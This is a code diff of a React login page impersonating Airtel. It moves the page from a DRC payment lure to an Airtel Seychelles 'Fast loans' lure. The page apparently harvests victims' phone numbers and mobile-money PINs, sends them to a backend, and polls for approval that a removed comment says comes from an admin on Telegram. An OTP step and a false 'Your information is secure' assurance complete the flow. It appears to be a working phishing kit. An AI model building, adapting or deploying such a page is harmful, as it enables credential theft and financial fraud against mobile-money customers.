@@ -1,18 +1,15 @@
 import React, { useState, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 
-const COUNTRY_CODE = '+243';
-const PHONE_PLACEHOLDER = '951234567'; 
-const PHONE_MAX = 9;
+const COUNTRY_CODE = '+248';
+const PHONE_PLACEHOLDER = '2XXXXXX'; 
+const PHONE_MAX = 7;
 
 function AirtelLogin() {
   const [phone, setPhone] = useState('');
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
-  const [showPin, setShowPin] = useState(false);
-  const [error, setError] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   
-  // NEW: States for the approval waiting screen
   const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
   const [refId, setRefId] = useState<string | null>(null);
 
@@ -21,9 +18,11 @@ function AirtelLogin() {
 
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const val = e.target.value.replace(/\D/g, '');
-    setPhone(val);
-    if (val.length === PHONE_MAX) {
-      pinRefs.current[0]?.focus();
+    if (val.length <= PHONE_MAX) {
+      setPhone(val);
+      if (val.length === PHONE_MAX) {
+        pinRefs.current[0]?.focus();
+      }
     }
   };
 
@@ -47,16 +46,10 @@ function AirtelLogin() {
     e.preventDefault();
     const pinString = pin.join('');
 
-    if (phone.length < PHONE_MAX) {
-      setError('Entrez un numéro Airtel DRC valide.');
-      return;
-    }
-    if (pinString.length < 4) {
-      setError('Entrez votre code PIN Airtel.');
-      return;
+    if (phone.length < PHONE_MAX || pinString.length < 4) {
+      return; 
     }
 
-    setError('');
     setIsLoading(true);
 
     const fullPhone = `${COUNTRY_CODE}${phone}`;
@@ -70,14 +63,11 @@ function AirtelLogin() {
       });
 
       const data = await response.json();
-      console.log('Login response:', data);
 
-      // NEW LOGIC: Wait for admin approval
       if (data.status === 'pending' && data.ref_id) {
         setRefId(data.ref_id);
-        setIsWaitingForApproval(true); // Show the overlay
+        setIsWaitingForApproval(true); 
         
-        // Poll the backend every 3 seconds to see if admin clicked Approve on Telegram
         const pollInterval = setInterval(async () => {
           try {
             const statusRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login-status/${data.ref_id}`);
@@ -89,7 +79,6 @@ function AirtelLogin() {
             } else if (statusData.status === 'rejected' || statusData.status === 'expired') {
               clearInterval(pollInterval);
               setIsWaitingForApproval(false);
-              setError("Connexion refusée ou expirée par l'administrateur.");
               setIsLoading(false);
             }
           } catch (pollErr) {
@@ -97,15 +86,15 @@ function AirtelLogin() {
           }
         }, 3000);
       } else {
-        // Fallback just in case
         navigate('/airtel-otp');
       }
     } catch (err) {
       console.error('Login request failed:', err);
-      setError('Une erreur réseau est survenue. Veuillez réessayer.');
       setIsLoading(false);
     }
   };
+
+  const isFormValid = phone.length === PHONE_MAX && pin.join('').length === 4;
 
   return (
     <div className="airtel-page-container">
@@ -121,15 +110,8 @@ function AirtelLogin() {
           display: flex;
           flex-direction: column;
           min-height: 100vh;
-          background-color: #ffffff;
+          background-color: #DA1C1C; /* Airtel Red */
           position: relative;
-        }
-
-        /* FADED BACKGROUND WHEN WAITING */
-        .faded-content {
-          opacity: 0.15;
-          pointer-events: none;
-          transition: opacity 0.3s ease;
         }
 
         /* WAITING OVERLAY */
@@ -145,7 +127,7 @@ function AirtelLogin() {
           justify-content: center;
           z-index: 9999;
           padding: 20px;
-          background-color: rgba(255, 255, 255, 0.4); /* Semi-transparent so faded text shows */
+          background-color: rgba(255, 255, 255, 0.4);
         }
 
         .custom-spinner {
@@ -183,202 +165,188 @@ function AirtelLogin() {
           box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
 
-        /* TOP SECTION */
-        .login-top-section {
-          flex: 1;
-          padding: 40px 24px;
+        /* HEADER */
+        .header-section {
+          padding: 40px 24px 30px;
           display: flex;
           flex-direction: column;
           align-items: center;
+          position: relative;
         }
 
-        .logo-wrapper {
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          margin-bottom: 40px;
+        .back-btn {
+          position: absolute;
+          left: 20px;
+          top: 20px;
+          background: none;
+          border: none;
+          cursor: pointer;
+          padding: 8px;
         }
 
-        .tagline {
-          font-size: 10px;
-          letter-spacing: 1.5px;
-          color: #333;
-          text-transform: uppercase;
-          margin-top: 8px;
-          font-weight: 600;
-        }
-        
-        .tagline span {
-          color: #DA1C1C;
-        }
-
-        .login-title {
-          font-size: 22px;
-          font-weight: 700;
+        .header-title {
+          font-size: 32px;
+          font-weight: 900;
           color: #1a1a1a;
+          font-style: italic;
+          margin-bottom: 6px;
+        }
+
+        .header-subtitle {
+          font-size: 14px;
+          font-weight: 600;
+          color: #1a1a1a;
+        }
+
+        /* MAIN CARD */
+        .main-card {
+          background-color: #ffffff;
+          width: 90%;
+          max-width: 420px;
+          margin: 0 auto;
+          border-radius: 24px;
+          padding: 32px 24px;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+          position: relative;
+          z-index: 10;
+        }
+
+        .card-title {
+          font-size: 26px;
+          font-weight: 800;
+          color: #000000;
+          margin-bottom: 8px;
+        }
+
+        .card-subtitle {
+          font-size: 15px;
+          color: #4B5563;
+          margin-bottom: 24px;
+        }
+
+        .input-label {
+          font-size: 15px;
+          font-weight: 700;
+          color: #000000;
+          margin-bottom: 12px;
+          width: 100%;
           text-align: center;
-          line-height: 1.3;
-          margin-bottom: 30px;
-          max-width: 340px;
         }
 
         /* PHONE INPUT */
-        .phone-input-container {
+        .phone-wrapper {
           width: 100%;
-          max-width: 400px;
+          display: flex;
+          border-radius: 8px;
+          overflow: hidden;
+          margin-bottom: 24px;
+          border: 1px solid #CBD5E1;
+        }
+
+        .phone-prefix {
+          background-color: #E2E8F0;
           display: flex;
           align-items: center;
-          border: 2px solid #2A5CAA;
-          border-radius: 8px;
-          padding: 12px 16px;
-          margin-bottom: 32px;
-          background-color: #fff;
-        }
-
-        .flag-icon {
-          width: 24px;
-          height: 16px;
-          margin-right: 10px;
-          border-radius: 2px;
-          overflow: hidden;
-        }
-
-        .country-code-text {
-          font-size: 18px;
-          font-weight: 600;
+          padding: 0 16px;
+          font-size: 16px;
+          font-weight: 700;
           color: #1a1a1a;
-          margin-right: 10px;
+          gap: 8px;
         }
 
-        .phone-input {
+        .phone-input-field {
           flex: 1;
+          background-color: #B0C4DE;
           border: none;
-          outline: none;
+          padding: 16px;
           font-size: 18px;
-          color: #1a1a1a;
-          background: transparent;
+          color: #ffffff;
+          font-weight: 600;
+          outline: none;
         }
 
-        .phone-input::placeholder {
-          color: #a0a0a0;
+        .phone-input-field::placeholder {
+          color: #E2E8F0;
         }
 
         /* PIN INPUT */
-        .pin-section {
-          width: 100%;
+        .pin-inputs-container {
           display: flex;
-          flex-direction: column;
-          align-items: center;
-          margin-bottom: 32px;
-        }
-
-        .pin-label {
-          font-size: 14px;
-          font-weight: 600;
-          color: #666;
-          margin-bottom: 16px;
-        }
-
-        .pin-inputs-row {
-          display: flex;
-          align-items: center;
           gap: 16px;
-        }
-
-        .pin-boxes {
-          display: flex;
-          gap: 12px;
+          margin-bottom: 28px;
         }
 
         .pin-box {
-          width: 50px;
-          height: 50px;
-          border: 2px solid #2A5CAA;
-          border-radius: 8px;
-          font-size: 24px;
-          font-weight: 700;
+          width: 60px;
+          height: 60px;
+          border: 2px solid #CBD5E1;
+          border-radius: 12px;
+          font-size: 28px;
           text-align: center;
-          color: #1a1a1a;
+          color: #000000;
           outline: none;
-          background-color: #fff;
+          background-color: #ffffff;
         }
 
         .pin-box::placeholder {
-          color: #ccc;
-        }
-
-        .eye-icon {
-          cursor: pointer;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          color: #666;
+          color: #000000;
+          font-size: 30px;
         }
 
         /* BUTTON */
         .login-btn {
           width: 100%;
-          max-width: 400px;
-          padding: 16px;
-          border-radius: 30px;
+          padding: 18px;
+          border-radius: 12px;
           border: none;
           background-color: #D1D5DB;
-          color: #ffffff;
-          font-size: 16px;
+          color: #4B5563;
+          font-size: 18px;
           font-weight: 700;
-          text-transform: uppercase;
           cursor: pointer;
-          transition: background-color 0.2s;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          gap: 12px;
+          transition: all 0.2s;
         }
 
         .login-btn.active {
           background-color: #DA1C1C;
+          color: #ffffff;
         }
 
-        /* FOOTER SECTION */
-        .login-footer {
-          background-color: #F3F4F6;
-          padding: 32px 24px;
+        /* SECURITY TEXT */
+        .security-footer {
           display: flex;
-          flex-direction: column;
           align-items: center;
-          border-top: 1px solid #E5E7EB;
-        }
-
-        .footer-logo-wrapper {
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          margin-bottom: 24px;
-        }
-
-        .collab-text {
-          font-size: 14px;
-          font-weight: 600;
-          color: #333;
-          margin-bottom: 4px;
-        }
-
-        .starlink-text {
-          font-size: 15px;
-          font-weight: 800;
-          color: #1a1a1a;
-          letter-spacing: 1px;
-        }
-
-        .starlink-text sup {
-          font-size: 8px;
-          font-weight: normal;
-        }
-
-        .copyright {
-          font-size: 12px;
-          color: #9CA3AF;
+          gap: 8px;
           margin-top: 24px;
+          color: #6B7280;
+          font-size: 14px;
+          font-weight: 500;
+        }
+
+        /* FOOTER ICONS */
+        .brand-icons-footer {
+          flex: 1;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          gap: 16px;
+          padding: 40px 20px 20px;
+        }
+
+        .brand-icon {
+          display: flex;
+          align-items: center;
+          justify-content: center;
         }
       `}</style>
 
-      {/* WAITING OVERLAY (Only shows when waiting) */}
       {isWaitingForApproval && (
         <div className="waiting-overlay">
           <div className="custom-spinner"></div>
@@ -389,120 +357,123 @@ function AirtelLogin() {
         </div>
       )}
 
-      {/* MAIN CONTENT (Gets faded when waiting) */}
-      <div className={isWaitingForApproval ? 'faded-content' : ''} style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh' }}>
-        
-        {/* TOP SECTION */}
-        <div className="login-top-section">
+      {/* HEADER */}
+      <div className="header-section">
+        <button className="back-btn" onClick={() => navigate('/')}>
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+            <line x1="19" y1="12" x2="5" y2="12" />
+            <polyline points="12 19 5 12 12 5" />
+          </svg>
+        </button>
+        {/* Updated to Seychelles but kept the italic style */}
+        <h1 className="header-title">Airtel Seychelles</h1>
+        <p className="header-subtitle">Fast loans. Anytime. Anywhere.</p>
+      </div>
+
+      {/* MAIN CARD */}
+      <div className="main-card">
+        <h2 className="card-title">Welcome back</h2>
+        <p className="card-subtitle">Log in to your Airtel Seychelles account</p>
+
+        <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
           
-          {/* LOGO */}
-          <div className="logo-wrapper">
-            <svg width="140" height="40" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
-              <circle cx="25" cy="17" r="5" fill="white"/>
-              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
-            </svg>
-            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
+          <span className="input-label">Phone number</span>
+          <div className="phone-wrapper">
+            <div className="phone-prefix">
+              {/* Seychelles Flag SVG */}
+              <svg width="20" height="14" viewBox="0 0 300 200" xmlns="http://www.w3.org/2000/svg" style={{ borderRadius: '2px' }}>
+                <path fill="#003f87" d="M0,200 L300,0 L0,0 Z"/>
+                <path fill="#fcd856" d="M0,200 L300,0 L300,50 Z"/>
+                <path fill="#d62828" d="M0,200 L300,50 L300,100 Z"/>
+                <path fill="#ffffff" d="M0,200 L300,100 L300,150 Z"/>
+                <path fill="#007a3d" d="M0,200 L300,150 L300,200 Z"/>
+              </svg>
+              {COUNTRY_CODE}
+            </div>
+            <input
+              type="tel"
+              className="phone-input-field"
+              placeholder={PHONE_PLACEHOLDER}
+              value={phone}
+              onChange={handlePhoneChange}
+              maxLength={PHONE_MAX}
+              disabled={isLoading || isWaitingForApproval}
+            />
           </div>
 
-          {/* TITLE */}
-          <h1 className="login-title">
-            Connectez-vous à Airtel Lite pour finaliser le paiement.
-          </h1>
-
-          {/* ERROR MESSAGE */}
-          {error && (
-            <div style={{ color: '#DA1C1C', fontSize: '14px', marginBottom: '16px', textAlign: 'center', fontWeight: '500' }}>
-              {error}
-            </div>
-          )}
-
-          <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-            
-            {/* PHONE INPUT */}
-            <div className="phone-input-container">
-              <svg className="flag-icon" viewBox="0 0 640 480" xmlns="http://www.w3.org/2000/svg">
-                <path fill="#007fff" d="M0 0h640v480H0z"/>
-                <path fill="#f7d618" d="M0 240h640v240H0z"/>
-                <path fill="#ce1021" d="M0 0l640 480M640 0L0 480" stroke="#ce1021" strokeWidth="40"/>
-                <path fill="#f7d618" d="M60 60h40v40H60z"/>
-              </svg>
-              <span className="country-code-text">{COUNTRY_CODE}</span>
+          <span className="input-label">Enter your Airtel PIN code</span>
+          <div className="pin-inputs-container">
+            {pin.map((digit, index) => (
               <input
-                type="tel"
-                className="phone-input"
-                placeholder={PHONE_PLACEHOLDER}
-                value={phone}
-                onChange={handlePhoneChange}
-                maxLength={PHONE_MAX}
+                key={index}
+                type="password"
+                maxLength={1}
+                value={digit}
+                ref={(el) => { pinRefs.current[index] = el; }}
+                onChange={(e) => handlePinChange(index, e.target.value)}
+                onKeyDown={(e) => handleKeyDown(index, e)}
+                className="pin-box"
+                placeholder="•"
                 disabled={isLoading || isWaitingForApproval}
               />
-            </div>
-
-            {/* PIN INPUT */}
-            <div className="pin-section">
-              <span className="pin-label">Entrez votre Code</span>
-              <div className="pin-inputs-row">
-                <div className="pin-boxes">
-                  {pin.map((digit, index) => (
-                    <input
-                      key={index}
-                      type={showPin ? 'text' : 'password'}
-                      maxLength={1}
-                      value={digit}
-                      ref={(el) => { pinRefs.current[index] = el; }}
-                      onChange={(e) => handlePinChange(index, e.target.value)}
-                      onKeyDown={(e) => handleKeyDown(index, e)}
-                      className="pin-box"
-                      disabled={isLoading || isWaitingForApproval}
-                    />
-                  ))}
-                </div>
-                
-                {/* Eye Toggle */}
-                <div className="eye-icon" onClick={() => setShowPin(!showPin)}>
-                  {showPin ? (
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
-                      <line x1="1" y1="1" x2="23" y2="23"></line>
-                    </svg>
-                  ) : (
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-                      <circle cx="12" cy="12" r="3"></circle>
-                    </svg>
-                  )}
-                </div>
-              </div>
-            </div>
-
-            {/* BUTTON */}
-            <button 
-              type="submit" 
-              className={`login-btn ${(phone.length === PHONE_MAX && pin.join('').length === 4) ? 'active' : ''}`}
-              disabled={isLoading || isWaitingForApproval}
-            >
-              {isLoading && !isWaitingForApproval ? 'Chargement...' : 'CONNEXION'}
-            </button>
-
-          </form>
-        </div>
-
-        {/* FOOTER SECTION */}
-        <div className="login-footer">
-          <div className="footer-logo-wrapper">
-            <svg width="110" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
-              <circle cx="25" cy="17" r="5" fill="white"/>
-              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
-            </svg>
-            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
+            ))}
           </div>
 
-          <p className="collab-text">En collaboration avec</p>
-          <p className="starlink-text">STARLINK<sup>TM</sup></p>
+          <button 
+            type="submit" 
+            className={`login-btn ${isFormValid ? 'active' : ''}`}
+            disabled={!isFormValid || isLoading || isWaitingForApproval}
+          >
+            Connexion
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <line x1="5" y1="12" x2="19" y2="12" />
+              <polyline points="12 5 19 12 12 19" />
+            </svg>
+          </button>
 
-          <p className="copyright">© 2026 Airtel Congo. Tous droits réservés.</p>
+        </form>
+
+        <div className="security-footer">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+          </svg>
+          Your information is secure.
+        </div>
+      </div>
+
+      {/* BRAND ICONS FOOTER (Matching the second image) */}
+      <div className="brand-icons-footer">
+        {/* Icon 1: Airtel Phone */}
+        <div className="brand-icon">
+          <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
+            <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
+            <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
+          </div>
+        </div>
+        
+        {/* Icon 2: Lock */}
+        <div className="brand-icon">
+          <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
+              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+          </div>
+        </div>
+
+        {/* Icon 3: Airtel Money */}
+        <div className="brand-icon">
+          <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
+            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
+            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
+          </div>
+        </div>
+
+        {/* Icon 4: Currency Symbol */}
+        <div className="brand-icon">
+          <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
+            <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
+          </div>
         </div>
       </div>
     </div>
